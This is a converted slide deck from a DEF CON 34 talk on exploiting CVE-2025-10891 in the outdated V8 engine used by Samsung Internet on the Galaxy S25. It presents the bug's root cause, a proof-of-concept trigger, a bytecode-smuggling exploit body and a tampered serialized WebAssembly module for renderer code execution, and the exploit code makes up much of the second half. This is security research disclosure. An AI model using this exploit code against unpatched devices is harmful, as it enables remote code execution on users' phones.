---
title: "Patch Gap to Mobile Renderer RCE Pwning Samsung Internet's V8 on the Galaxy S25"
speakers: ["Hrvoje Mišetić", "Jamie Hill-Daniel", "William Liu"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Hrvoje Mišetić, Jamie Hill-Daniel, William Liu - Patch Gap to Mobile Renderer RCE Pwning Samsung Internet's V8 on the Galaxy S25 - Mis.pdf"
pages: 122
sha256: "4a0c1b841dadc4333496347842366f834e96f6136b3f303fdd7f777e6e9bef73"
text_chars: 38785
ocr_pages: 14
has_ocr: true
redacted_secrets: 0
ocr_confidence: 92.6
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:34:58Z"
---
# Patch Gap to Mobile Renderer RCE Pwning Samsung Internet's V8 on the Galaxy S25

**Speakers:** Hrvoje Mišetić, Jamie Hill-Daniel, William Liu  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Hrvoje Mišetić, Jamie Hill-Daniel, William Liu - Patch Gap to Mobile Renderer RCE Pwning Samsung Internet's V8 on the Galaxy S25 - Mis.pdf` (122 pages)


## Slide 1

**Patch Gap to Mobile Renderer RCE**

Pwning Samsung Internet's V8 on the Galaxy S25

William Liu, Jamie Hill-Daniel, Hrvoje Mišetić

## Slide 2

## **AGENDA**

2

## Slide 3

## **AGENDA**

❯ **OUTDATED V8 BUILDS IN THE WILD**

3

## Slide 4

**AGENDA**

❯ **OUTDATED V8 BUILDS IN THE WILD** ❯ **CVE-2025-10891 ANALYSIS**

4

## Slide 5

**AGENDA**

❯ **OUTDATED V8 BUILDS IN THE WILD** ❯ **CVE-2025-10891 ANALYSIS** ❯ **BYTECODE SMUGGLING EXPLOIT**

5

## Slide 6

**AGENDA**

❯ **OUTDATED V8 BUILDS IN THE WILD** ❯ **CVE-2025-10891 ANALYSIS** ❯ **BYTECODE SMUGGLING EXPLOIT** ❯ **ACHIEVING UNIVERSAL XSS**

6

## Slide 7

## **SUPPLY CHAIN COMPLEXITY**

7

## Slide 8

## **SUPPLY CHAIN COMPLEXITY**

8

## Slide 9

## **SUPPLY CHAIN COMPLEXITY**

9

## Slide 10

### **THE PLANET RUNS ON V8?**

### **ALWAYS HAS BEEN**

10

## Slide 11

11

## Slide 12

12

## Slide 13

13

## Slide 14

14

## Slide 15

15


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The Chrome team is delighted to announce the promotion of
Chrome 150 to the stable channel for Windows, Mac and
Linux. This will roll out over the coming days/weeks.
Chrome 150.0.7871.46 (Linux) 150.0.7871.46/.47 Windows/
Mac contains a number of fixes and improvements -- a list of
changes is available in the log. Watch out for upcoming
Chrome and Chromium blog posts about new features and
big efforts delivered in 150.
Security Fixes and Rewards
; may be kept restri
estrictions
library that other proje
This update includes 4: y fixes. Please see the Chrome Security Page for
more information
IS
```

## Slide 16

16


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
This update includes 433 security fixes. Please see the Chrome Security Page for
more information.
```

## Slide 17

## **SAMSUNG INTERNET**

17

## Slide 18

## **SAMSUNG INTERNET**

18

## Slide 19

## **IDENTIFYING THE V8 VERSION**

19

## Slide 20

## **IDENTIFYING THE V8 VERSION**

20


> Recovered by OCR — confidence 82/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
IDENTIFYING THE V8 VERSION
int32_t Version
int32_t Version
int32_t Version
int32_t Version
:major_
:minor_
:patch_
13
233
18
Commit 5297e56 3
@ ve Autoroll committed on May 6, 2025
Version 13.6.233.10
Version incremented at https://cr-buildbucket .appspot . com/build/8715617119500869441
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6512719
Bot-Commit: v8-ci-autoroll-builder <v8-ci-autoroll-builder@chops-service-
accounts. iam.gserviceaccount .com>
Cr-Branched-From: 04fa9cb-refs/heads/13.6.2330{#1}
Cr-Branched-From: fébe482-refs/heads/main@{#99571}
chromium/7103_108 13.6.233.10-pgo
1 parent 27d@a5@ commit 5297e56 (0)
1 file changed 1-18
20
```

## Slide 21

## **IDENTIFYING THE V8 VERSION**

21


> Recovered by OCR — confidence 84/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IDENTIFYING THE V8 VERSION
int32_t Version
int32_t Version
int32_t Version
int32_t Version
:major_
:minor_
:patch_
13
233
18
e. May 6, 2025
Vers
Version incremented at https://c
Bot-Commit: v8-ci-autoroll-builder <v8-ci-autoroll-builder@chops-service-
accounts. iam.gserviceaccount .com>
Cr-Branched-From: 04fa9cb-refs/heads/13.6.2330{#1}
Cr-Branched-From: fébe482-refs/heads/main@{#99571}
chromium/7103_108 13.6.233.10-pgo
1 parent 27d@a5@ commit 5297e56 (0)
1 file changed 1-18
21
```

## Slide 22

## **6 MONTHS OUT OF DATE…**

(As of November 2025)

22

## Slide 23

**IT’S N-DAY TIME**

23

## Slide 24

### **CHROME SECURITY ARCHITECTURE (2026)**

24


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHROME SECURITY ARCHITECTURE (2026)
Chrome
Operating System )
24
```

## Slide 25

### **CHROME SECURITY ARCHITECTURE (2026)**

25


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHROME SECURITY ARCHITECTURE (2026)
Sandbox
Renderer
[ Operating System |
25
```

## Slide 26

## **TYPICAL EXPLOIT CHAIN (2026)**

26

## Slide 27

## **TYPICAL EXPLOIT CHAIN (2026)**

27


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TYPICAL EXPLOIT
crbug.com/330760873 crbug.com/330404819
“Out-of-bounds access in enum cache” “V8 Sandbox escape via regexp"
[ arivary read-write in the v8 heap] Arbitrary code execution in a
sandboxed renderer
(2026)
27
```

## Slide 28

## **TYPICAL EXPLOIT CHAIN (2026)**

28


> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TYPICAL EXPLOIT
(2026)
crbug.com/330760873
“Out-of-bounds access in enum cache”
crbug.com/330404819
“V8 Sandbox escape via regexp"
crbug.com/526265798
“Mojo IPC handle type confusion”
[ arivary read-write in the v8 heap]
Arbitrary code execution in a
sandboxed renderer
28
```

## Slide 29

## **#FREEV8**

29

## Slide 30

## **CHROME RENDERER EXPLOITS**

30

## Slide 31

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

31

## Slide 32

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

**Sparkplug Translates bytecode to native code**

32

## Slide 33

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

**Sparkplug Translates bytecode to native code**

**Turboshaft New CFG-based optimizing compiler**

33

## Slide 34

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

**Sparkplug Translates bytecode to native code**

**Turboshaft New CFG-based optimizing compiler**

**Liftoff WASM baseline compiler**

34

## Slide 35

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

**Liftoff WASM baseline compiler**

**Sparkplug Translates bytecode to native code**

**Ignition Bytecode Interpreter**

**Turboshaft New CFG-based optimizing compiler**

35

## Slide 36

## **CHROME RENDERER EXPLOITS**

**TurboFan Optimizing graph-based compiler**

**Liftoff WASM baseline compiler**

**Sparkplug Translates bytecode to native code**

**Ignition Bytecode Interpreter**

**Turboshaft New CFG-based optimizing compiler**

**Maglev Intermediary Optimizing Compiler**

36

## Slide 37

## **COR’S FIRST LAW OF V8 COMPILERS**

37

## Slide 38

## **COR’S FIRST LAW OF V8 COMPILERS**

Every additional V8 compiler built to improve web performance will be met with a greater and opposing increase in JavaScript framework bloat

38

## Slide 39

## **COR’S FIRST LAW OF V8 COMPILERS**

WEB
BLOAT
FACTOR
# OF V8 COMPILERS

Every additional V8 compiler built to improve web performance will be met with a greater and opposing increase in JavaScript framework bloat

39

## Slide 40

## **CVE-2025-10891**

40

## Slide 41

## **CVE-2025-10891**

**Ignition**

41

## Slide 42

## **ROOT CAUSE**

function simple() { 0 : 1b ff f8 **Mov** <context>, r1 try { 3 : 0d 04 **LdaSmi** [4] let a = 4; 5 : ce **Star0** if (a > 0) { 6 : 0c **LdaZero** throw a; 7 : 76 f9 00 **TestGreaterThan** r0, [0] } 10 : a3 05 **JumpIfFalse** [5] (@ 15) return 1; 12 : 0b f9 **Ldar** r0 } catch (e) { 14 : b1 **Throw** return e; 15 : 0d 01 **LdaSmi** [1] } 17 : b3 **Return** } 18 : cc **Star2** 19 : 8b f7 00 **CreateCatchContext** r2, [0] 22 : cd **Star1** 23 : 10 **LdaTheHole** 24 : b0 **SetPendingMessage** 25 : 0b f8 **Ldar** r1 27 : 1c f7 **PushContext** r2 29 : 19 02 **LdaImmutableCurrentContextSlot** [2] 31 : b3 **Return**

**Handler Table** from   to         hdlr (   3,  18)  ->    18   (prediction=1, data=1)

42

## Slide 43

## **ROOT CAUSE**

function simple() { 0 : 1b ff f8 **Mov** <context>, r1 try { 3 : 0d 04 **LdaSmi** [4] let a = 4; 5 : ce **Star0** if (a > 0) { 6 : 0c **LdaZero** throw a; 7 : 76 f9 00 **TestGreaterThan** r0, [0] } 10 : a3 05 **JumpIfFalse** [5] (@ 15) return 1; 12 : 0b f9 **Ldar** r0 } catch (e) { 14 : b1 **Throw** return e; 15 : 0d 01 **LdaSmi** [1] } 17 : b3 **Return** } 18 : cc **Star2** 19 : 8b f7 00 **CreateCatchContext** r2, [0] 22 : cd **Star1** 23 : 10 **LdaTheHole** 24 : b0 **SetPendingMessage** 25 : 0b f8 **Ldar** r1 27 : 1c f7 **PushContext** r2 29 : 19 02 **LdaImmutableCurrentContextSlot** [2] 31 : b3 **Return**

**Handler Table** from   to         hdlr (   3,  18)  ->    18   (prediction=1, data=1)

43

## Slide 44

## **ROOT CAUSE**

class HandlerTable { const int number_of_entries; struct handler_entry_t *entries; } struct handler_entry_t { int32_t range_start; int32_t range_end; struct range_handler_t range_handler; int32_t range_data; } struct range_handler_t { CatchPrediction prediction :  3; bool            used       :  1; int             offset     : 28; }

44

## Slide 45

## **ROOT CAUSE**

class HandlerTable { const int number_of_entries; struct handler_entry_t *entries; } struct handler_entry_t { int32_t range_start; int32_t range_end; struct range_handler_t range_handler; int32_t range_data; } struct range_handler_t { CatchPrediction prediction :  3; bool            used       :  1; int             offset     : 28; }

45

## Slide 46

## **ROOT CAUSE**

class HandlerTable { const int number_of_entries; struct handler_entry_t *entries; } struct handler_entry_t { int32_t range_start; int32_t range_end; struct range_handler_t range_handler; int32_t range_data; } struct range_handler_t { CatchPrediction prediction :  3; bool            used       :  1; int             offset     : 28; }

46

## Slide 47

## **ROOT CAUSE**

class HandlerTable { const int number_of_entries; struct handler_entry_t *entries; } struct handler_entry_t { int32_t range_start; int32_t range_end; struct range_handler_t range_handler; int32_t range_data; } struct range_handler_t { CatchPrediction prediction :  3; bool            used       :  1; int             offset     : 28; }

47

## Slide 48

## **ROOT CAUSE**

class HandlerTable { const int number_of_entries; struct handler_entry_t *entries; } struct handler_entry_t { int32_t range_start; int32_t range_end; struct range_handler_t range_handler; int32_t range_data; } struct range_handler_t { CatchPrediction prediction :  3; bool            used       :  1; int             offset     : 28; }

48

## Slide 49

## **ROOT CAUSE**

void HandlerTable::SetRangeHandler(int index, int handler_offset, CatchPrediction prediction) { int value = HandlerOffsetField::encode(handler_offset) | HandlerWasUsedField::encode(false) | HandlerPredictionField::encode(prediction); int offset = index * kRangeEntrySize + kRangeHandlerIndex; Memory<int32_t>(raw_encoded_data_ + offset * sizeof(int32_t)) = value; }

49

## Slide 50

#### **WHAT IF HANDLER_OFFSET DOESN’T FIT INTO 28 BITS?**

50

## Slide 51

## **PROOF OF CONCEPT**

let kNumYields = 500000; let body = ` if ("foo" === "bar") { ${"yield* 42;".repeat(kNumYields)} } try { throw 42; } catch (e) { // Will never get here } `;

const AsyncGeneratorFunction = Object.getPrototypeOf( async function*(){} ).constructor; let bug = new AsyncGeneratorFunction(body); let r = bug();  // Create the generator object r.next();       // Execute the code

51

## Slide 52

## **PROOF OF CONCEPT**

... 294567979 : 0d 2a **LdaSmi** [42] 294567981 : b5 **Throw** 294567982 : cb **Star7** 294567983 : 01 8d f2 ff ff ff c7 46 2e 00 **CreateCatchContext.ExtraWide** r7, [3032775] 294567993 : cc **Star6** 294567994 : 10 **LdaTheHole** 294567995 : b4 **SetPendingMessage** ...

**Handl** e **r Table (size = 48)** from   to                 hdlr (prediction,   data) (  30,294568033)       ->  26132577 (prediction=3, data=4) (  33,294568013)       ->  26132557 (prediction=3, data=5) (294567979,294567982)  -> **26132526** (prediction=1, data=6)

52

## Slide 53

## **PROOF OF CONCEPT**

**Handl** e **r Table (size = 48)** from   to                 hdlr (prediction,   data) (  30,294568033)       ->  26132577 (prediction=3, data=4) (  33,294568013)       ->  26132557 (prediction=3, data=5) (294567979,294567982)  -> **26132526** (prediction=1, data=6) 1 0001100011101100000000101110 = 294567982 1 0001100011101100000000101110 =  26132526 [----------28 bits-----------]

53

## Slide 54

## **WHY THIS BUG?**

54

## Slide 55

## **FREE UBERCAGE ESCAPE**

55

## Slide 56

## **FREE UBERCAGE ESCAPE**

56

## Slide 57

## **BYTECODE SMUGGLING**

<u>Produces bytecode:</u> function smuggle() { 01 0d be be 93 06 ce let a = 0x0693bebe; 01 0d 04 04 93 06 cd let b = 0x06930404; 0e be let c = ...; }

Regular Execution Smuggled Code 0 : 01 0d be be 93 06 **LdaSmi.ExtraWide** [110345918] 2 : be **Abort** 6 : ce **Star0** 3 : be **Abort** 7 : 01 0d 04 04 93 06 **LdaSmi.ExtraWide** [110298116] 4 : 93 06 **Jump** [6] (-> 10) 13 : cd **Star1** ... 14 : 0e **LdaUndefined** 10 : 04 **DebugBreak** 15 : b3 **Return** 11 : 04 **DebugBreak** 12 : 93 06 **Jump** [6] (-> 18) ...

57

## Slide 58

## **IGNITION BYTECODE**

function smi() { 0 : 0d 01 **LdaSmi** [1] let a = 0x01; 2 : ce **Star0** let b = 0x0202; 3 : 00 0d 02 02 **LdaSmi.Wide** [514] let d = 0x04040404; 7 : cd **Star1** let e = 0x0505050505; 8 : 01 0d 04 04 04 04 **LdaSmi.ExtraWide** [67372036] } 14 : cc **Star2** 15 : 13 00 **LdaConstant** [0] 17 : cb **Star3** 18 : 0e **LdaUndefined Constant pool (size = 1)** 0x2e1700140071: [TrustedFixedArray] - length: 1 0: 0x38fa0019907d <HeapNumber 21559051525.0>

58

## Slide 59

## **INCREASING CONTROL**

eval(` 0 : 0d 05 **LdaSmi** [5] function feedback() { 2 : ce **Star0** let a = 5; 3 : 4b 05 00 **AddSmi** [5], [0] ${"a+5;".repeat(0xffff+10)} 6 : 0b f9 **Ldar** r0 } 8 : 4b 05 01 **AddSmi** [5], [1] feedback(); **. . .** 1283 : 00 4b 05 00 00 01 **AddSmi.Wide** [5], [256] `); 1289 : 0b f9 **Ldar** r0 1291 : 00 4b 05 00 01 01 **AddSmi.Wide** [5], [257] 1297 : 0b f9 **Ldar** r0 1299 : 00 4b 05 00 02 01 **AddSmi.Wide** [5], [258] **. . .** 523523 : 01 4b 05 00 00 00 00 00 01 00 **AddSmi.ExtraWide** [5], [65536] 523533 : 0b f9 **Ldar** r0 523535 : 01 4b 05 00 00 00 01 00 01 00 **AddSmi.ExtraWide** [5], [65537] 523545 : 0b f9 **Ldar** r0 523547 : 01 4b 05 00 00 00 02 00 01 00 **AddSmi.ExtraWide** [5], [65538]

59

## Slide 60

## **RUNTIME FUNCTIONS**

d8> let obj = { a: [1, 2, 3, 4], b: "hello!", c: 3}; d8> %DebugPrint(obj)

DebugPrint: 0x80100047569: [JS_OBJECT_TYPE]

- map: 0x080100199089 <Map[24](HOLEY_ELEMENTS)> [FastProperties]

- prototype: 0x080100182a81 <Object map = 0x8010018208d>

- elements: 0x080100000745 <FixedArray[0]> [HOLEY_ELEMENTS]

- properties: 0x080100000745 <FixedArray[0]>

- All own properties (excluding elements): {

0x80100003449: [String] in ReadOnlySpace: #a: 0x080100047581 <JSArray[4]> 0x80100003459: [String] in ReadOnlySpace: #b: 0x080100198ef1 <String[6]: #hello!>

0x80100003469: [String] in ReadOnlySpace: #c: 3

}

60

## Slide 61

## **CALLRUNTIME PRIMITIVE**

$ v8 --allow-natives-syntax --print-bytecode debug.js d8> %DebugPrint(1,2,3,4) 0 : 0d 01             LdaSmi [1] 2 : cd                Star1 3 : 0d 02             LdaSmi [2] 5 : cc                Star2 6 : 0d 03             LdaSmi [3] 8 : cb                Star3 9 : 0d 04             LdaSmi [4] 11 : ca                Star4 12 : 6c b2 01 f8 04 CallRuntime [DebugPrint], r1-r4

- // CallRuntime <RuntimeID> <Arg0> <Argc>

61

## Slide 62

## **IT’S WASM TIME**

62


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IT'S WASM TIME
Change Info Show All v
Submitted Aug 25, 2025
Owner akob Kummerow
Reviewers @Leszek Swirski@) @ V8 LUCI CQ )
Jakob Kummerow
cc (Q Matthias Liedt... (> v8-reviews@g...
Repo| Branch v8/v8 | main
Hashtags wasm
Submit Requirements
@ Code-Review
@ Code-Owners Approved
Trigger Votes
[wasm] Move %DeserializeWasmModule to d8.wasm.deserializeModule
along with its Serialize... counterpart.
The motivation is to exclude potentially-abusable functionality
from shipping binaries as an additional layer of hardening.
Bonus change: drop Runtime_WasmNull, because it is not sufficiently
useful to be kept around.
Bug: 440016843
Auto-Submit: Jakob Kummerow <jkummerow®chromium.org>
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Leszek Swirski <leszeks@chromium.org>
Comments
Checks
62
```

## Slide 63

## **THREADING IT TOGETHER**

async function *f(arg1, arg2) { if ("foo" === "bar") { // unreachable block // where exploit will live let a1 = 0x0f0000be;  // not executed, pad let a2 = 0x0f0000be;  // register counts // ... let a120 = 0x6931111; // LdaTrue + Jump Next let a121 = 0x6931111; // Acts as nop slide let a122 = 0x8931111; // becomes star.wide now let a123 = 0x8931111; // ... let a214 = 0x8931111; a1 = 0xe931111;       // Jump Next try { // Repeatedly increment the feedback slot counter ${'a1 + 0xa931111;'.repeat(0x059301)} // [01 4b] (skipped) // [<6c:CallRuntime> <0266:kDeserializeWasmModule> <04:reg = arg1> <argc:2>] // [<0x93:Jump> <0x05>:to Throw>] a1 + 0x0402666c; throw 0x0393e71a; // Star [a16], Jump to Catch } catch (e) { console.log("foo"); yield a16;        // Yield our module back to JS } if (1 == 0) {  // Unreachable block, pads instruction count ${'yield* 1'.repeat(kNumYields)}; } try { throw 1;  // Trigger the bug, this will jump into our exploit slide } catch (e) {} } }

63

## Slide 64

## **THREADING IT TOGETHER**

async function *f(arg1, arg2) { if ("foo" === "bar") { // unreachable block // where exploit will live let a1 = 0x0f0000be;  // not executed, pad let a2 = 0x0f0000be;  // register counts // ... let a120 = 0x6931111; // LdaTrue + Jump Next let a121 = 0x6931111; // Acts as nop slide let a122 = 0x8931111; // becomes star.wide now let a123 = 0x8931111; // ... let a214 = 0x8931111; a1 = 0xe931111;       // Jump Next try { // Repeatedly increment the feedback slot counter ${'a1 + 0xa931111;'.repeat(0x059301)} // [01 4b] (skipped) // [<6c:CallRuntime> <0266:kDeserializeWasmModule> <04:reg = arg1> <argc:2>] // [<0x93:Jump> <0x05>:to Throw>] a1 + 0x0402666c; throw 0x0393e71a; // Star [a16], Jump to Catch } catch (e) { console.log("foo"); yield a16;        // Yield our module back to JS } if (1 == 0) {  // Unreachable block, pads instruction count ${'yield* 1'.repeat(kNumYields)}; } try { throw 1;  // Trigger the bug, this will jump into our exploit slide } catch (e) {} } }

64

## Slide 65

## **THREADING IT TOGETHER**

async function *f(arg1, arg2) { if ("foo" === "bar") { // unreachable block // where exploit will live let a1 = 0x0f0000be;  // not executed, pad let a2 = 0x0f0000be;  // register counts // ... let a120 = 0x6931111; // LdaTrue + Jump Next let a121 = 0x6931111; // Acts as nop slide let a122 = 0x8931111; // becomes star.wide now let a123 = 0x8931111; // ... let a214 = 0x8931111; a1 = 0xe931111;       // Jump Next try { // Repeatedly increment the feedback slot counter ${'a1 + 0xa931111;'.repeat(0x059301)} // [01 4b] (skipped) // [<6c:CallRuntime> <0266:kDeserializeWasmModule> <04:reg = arg1> <argc:2>] // [<0x93:Jump> <0x05>:to Throw>] a1 + 0x0402666c; throw 0x0393e71a; // Star [a16], Jump to Catch } catch (e) { console.log("foo"); yield a16;        // Yield our module back to JS } if (1 == 0) {  // Unreachable block, pads instruction count ${'yield* 1'.repeat(kNumYields)}; } try { throw 1;  // Trigger the bug, this will jump into our exploit slide } catch (e) {} } }

65

## Slide 66

## **THREADING IT TOGETHER**

async function *f(arg1, arg2) { if ("foo" === "bar") { // unreachable block // where exploit will live let a1 = 0x0f0000be;  // not executed, pad let a2 = 0x0f0000be;  // register counts // ... let a120 = 0x6931111; // LdaTrue + Jump Next let a121 = 0x6931111; // Acts as nop slide let a122 = 0x8931111; // becomes star.wide now let a123 = 0x8931111; // ... let a214 = 0x8931111; a1 = 0xe931111;       // Jump Next try { // Repeatedly increment the feedback slot counter ${'a1 + 0xa931111;'.repeat(0x059301)} // [01 4b] (skipped) // [<6c:CallRuntime> <0266:kDeserializeWasmModule> <04:reg = arg1> <argc:2>] // [<0x93:Jump> <0x05>:to Throw>] a1 + 0x0402666c; throw 0x0393e71a; // Star [a16], Jump to Catch } catch (e) { console.log("foo"); yield a16;        // Yield our module back to JS } if (1 == 0) {  // Unreachable block, pads instruction count ${'yield* 1'.repeat(kNumYields)}; } try { throw 1;  // Trigger the bug, this will jump into our exploit slide } catch (e) {} } }

66

## Slide 67

## **THREADING IT TOGETHER**

async function *f(arg1, arg2) { if ("foo" === "bar") { // unreachable block // where exploit will live let a1 = 0x0f0000be;  // not executed, pad let a2 = 0x0f0000be;  // register counts // ... let a120 = 0x6931111; // LdaTrue + Jump Next let a121 = 0x6931111; // Acts as nop slide let a122 = 0x8931111; // becomes star.wide now let a123 = 0x8931111; // ... let a214 = 0x8931111; a1 = 0xe931111;       // Jump Next try { // Repeatedly increment the feedback slot counter ${'a1 + 0xa931111;'.repeat(0x059301)} // [01 4b] (skipped) // [<6c:CallRuntime> <0266:kDeserializeWasmModule> <04:reg = arg1> <argc:2>] // [<0x93:Jump> <0x05>:to Throw>] a1 + 0x0402666c; throw 0x0393e71a; // Star [a16], Jump to Catch } catch (e) { console.log("foo"); yield a16;        // Yield our module back to JS } if (1 == 0) {  // Unreachable block, pads instruction count ${'yield* 1'.repeat(kNumYields)}; } try { throw 1;  // Trigger the bug, this will jump into our exploit slide } catch (e) {} } }

67

## Slide 68

## **EVIL WASM MODULE**

var wasm_code = new Uint8Array([ // Any WASM module exporting a function 'main' ]); var module = new WebAssembly.Module(wasm_code); var inst = new WebAssembly.Instance(module); var func = inst.exports.main; // Generate machine code %WasmTierUpFunction(func); let f = %SerializeWasmModule(module); console.log(JSON.stringify(Array.from(new Uint8Array(f))));

68

## Slide 69

## **EVIL WASM MODULE**

var wasm_code = new Uint8Array([ // Any WASM module exporting a function 'main' ]); var module = new WebAssembly.Module(wasm_code); var inst = new WebAssembly.Instance(module); var func = inst.exports.main; // Generate machine code %WasmTierUpFunction(func); let f = %SerializeWasmModule(module); console.log(JSON.stringify(Array.from(new Uint8Array(f))));

[147, 6, 222, 192, 20, 119, 44, 43, 255, 62, 3, 0, 251, 59, 217, 244, 0, 0, 3, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 32, 0, 0, 0, 20, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 85, 72, 137, 229, 106, 8, 86, 184, 42, 0, 0, 0, 72, 139, 229, 93, 195, 144, 102, 144, 4, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 93, 198, 0]

69

## Slide 70

## **EVIL WASM MODULE**

var wasm_code = new Uint8Array([ // Any WASM module exporting a function 'main' ]); var module = new WebAssembly.Module(wasm_code); var inst = new WebAssembly.Instance(module); var func = inst.exports.main; // Generate machine code %WasmTierUpFunction(func); let f = %SerializeWasmModule(module); console.log(JSON.stringify(Array.from(new Uint8Array(f))));

[147, 6, 222, 192, 20, 119, 44, 43, 255, 62, 3, 0, 251, 59, 217, 244, 0, 0, 3, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 32, 0, 0, 0, 20, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 85, 72, 137, 229, 106, 8, 86, 184, 42, 0, 0, 0, 72, 139, 229, 93, 195, 144, 102, 144, 4, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 93, 198, 0]

70

## Slide 71

## **EVIL WASM MODULE**

var wasm_code = new Uint8Array([ // Any WASM module exporting a function 'main' ]); var module = new WebAssembly.Module(wasm_code); var inst = new WebAssembly.Instance(module); var func = inst.exports.main; // Generate machine code %WasmTierUpFunction(func); let f = %SerializeWasmModule(module); console.log(JSON.stringify(Array.from(new Uint8Array(f))));

[147, 6, 222, 192, 20, 119, 44, 43, 255, 62, 3, 0, 251, 59, 217, 244, 0, 0, 3, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 32, 0, 0, 0, 20, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 85, 72, 137, 229, 106, 8, 86, 184, 42, 0, 0, 0, 72, 139, 229, 93, 195, 144, 102, 144, 4, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 93, 198, 0]

const kTrap = 0xcc; [147, 6, 222, 192, 20, 119, 44, 43, 255, 62, 3, 0, 251, 59, 217, 244, 0, 0, 3, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 32, 0, 0, 0, 20, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 32, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, kTrap, kTrap, kTrap, kTrap, 106, 8, 86, 184, 42, 0, 0, 0, 72, 139, 229, 93, 195, 144, 102, 144, 4, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 93, 198, 0]

71

## Slide 72

const bug_func = eval(`async function *f(arg1, arg2){ ${exploit_body}; }; f`); (async () => { const buffer = new Uint8Array([ // Manipulated WASM module ]); const wasm_code = new Uint8Array([ // Regular WASM code bytes ]); let r = bug_func(wasm_code, buffer.buffer); console.log('triggering'); result = (await r.next()).value; const wasm_instance = new WebAssembly.Instance(result); const f = wasm_instance.exports.main; f(); })();

72

## Slide 73

const bug_func = eval(`async function *f(arg1, arg2){ ${exploit_body}; }; f`); (async () => { const buffer = new Uint8Array([ // Manipulated WASM module ]); const wasm_code = new Uint8Array([ // Regular WASM code bytes ]); let r = bug_func(wasm_code, buffer.buffer); console.log('triggering'); result = (await r.next()).value; const wasm_instance = new WebAssembly.Instance(result); const f = wasm_instance.exports.main; f(); })();

73

## Slide 74

# **RENDERER PWNED!**

